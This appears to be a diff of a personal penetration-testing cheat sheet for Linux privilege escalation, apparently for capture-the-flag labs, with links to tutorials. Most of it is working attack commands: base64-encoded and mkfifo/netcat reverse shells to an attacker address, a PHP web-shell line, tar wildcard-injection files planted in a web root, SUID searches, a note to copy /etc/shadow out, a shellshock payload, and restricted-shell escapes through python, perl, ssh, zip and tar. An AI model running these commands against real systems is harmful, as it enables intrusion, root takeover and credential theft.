@@ -1,12 +1,31 @@
 https://www.helpnetsecurity.com/2014/06/27/exploiting-wildcards-on-linux/
-setuid binary
-doccument root
+https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-1-using-suid-bit-QpmlexgrZrd
+ghi de PATH variable
 cronjob
+backupfile --> check cronjob
+/etc/hosts
+/etc/apache/000-default.conf
+sudo -l   #check permission
 
-nc -lvp 5555
+cat /etc/issue         #check linux version
+uname -a               #check kernal version
+cat /proc/cpuinfo      --> model name: AMD  --> virtual machine
+cat /sys/class/dmi/id/     product_name
+check file config in /etc/<module_name>
+
+https://hackmd.io/@endy/B1C24TlOj  #ngrok reverse shell
+https://bugbase.in/blog/catching-reverse-shells-over-the-internet
+echo -n "/bin/bash  -c 'bash -i  >& /dev/tcp/10.10.14.8/9001  0>&1'  "|base64 -w 0
+<?php system("echo -n <base64code> | base64 -d | bash") ?>
+nc -lvnp 5555
 nc 172.23.255.217 5555 /etc/bash
+https://viperone.gitbook.io/pentest-everything/writeups/tryhackme/linux/cat-pictures
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP> <Port> >/tmp/f
 echo 'os.execute("cat /root/flag.txt")' > /tmp/a.lua
 
+find / -perm -u=s -type f 2>/dev/null
+find / -perm -4000 2>/dev/null    #exec file with the owner file permission
+echo ./*
 ls -lia $(find / -perm -4000)
 nmap --script=/tmp/a.lua
 
@@ -41,3 +60,29 @@ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <your ip>
 1234 >/tmp/f" > shell.sh
 touch "/var/www/html/--checkpoint-action=exec=sh shell.sh"
 touch "/var/www/html/--checkpoint=1"
+
+sudo visudo
+https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-1-using-suid-bit-QpmlexgrZrd
+time  nano  find  vim  cp
+https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-0-using-sudo-rights-3Q75w8x2KWb
+less  awk  man  vi  env  ftp  socat nano
+scp to send /etc/shadow
+https://www.exploit-db.com/docs/44592
+gdb more less rvim
+
+1) From except > except spawn sh then sh.
+2) From python > python -c 'import os; os.system("/bin/sh")'
+3) From php > php -a then exec("sh -i");
+4) From perl > perl -e 'exec "/bin/sh";'
+5) From lua > os.execute('/bin/sh').
+6) From ruby > exec "/bin/sh"
+
+1)From ssh > ssh username@IP - t "/bin/sh" or "/bin/bash"
+2)From ssh2 > ssh username@IP -t "bash --noprofile"
+3)From ssh3 > ssh username@IP -t "() { :; }; /bin/bash" (shellshock)
+4)From ssh4 > ssh -o ProxyCommand="sh -c /tmp/yourfile.sh" 127.0.0.1 (SUID)
+5)From git > git help status > you can run it then !/bin/bash
+6)From pico > pico -s "/bin/bash" then you can write /bin/bash and then CTRL + T
+7)From zip > zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c"/bin/bash"
+8)From tar > /bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+https://viblo.asia/p/leo-thang-dac-quyen-trong-linux-linux-privilege-escalation-3-bypass-restricted-shell-3P0lPPyGlox
